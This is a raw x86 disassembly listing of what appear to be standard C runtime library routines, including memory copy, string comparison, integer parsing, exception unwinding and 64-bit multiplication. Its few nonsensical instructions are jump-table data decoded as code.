  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
